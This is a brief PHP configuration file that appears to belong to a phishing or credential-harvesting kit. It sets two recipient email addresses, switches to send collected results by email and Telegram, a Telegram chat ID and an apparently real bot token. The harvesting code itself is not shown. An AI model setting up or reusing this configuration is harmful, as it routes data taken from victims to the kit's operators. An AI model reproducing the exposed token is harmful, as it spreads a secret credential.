<?php
/*
*** Set your email below and configure functions to your requirments ***
*** FUNCTION CONTROL: 1=ON  and 0=OFF ***
EXAMPLE
$Example=1;  // Function On
$Example=0;  // Function Off
*/
$youremail='kaltapisk@gmail.com,gebniccast@yandex.com';  // Set your email
$Send_to_Email='1';
$Send_to_Telegram='1';
$chatID = "-714803744";
$token = "5388844856:AAFlLbuQbwULC-vFmrNzb8ws-6_e_2mKqps";
/*
*/
?>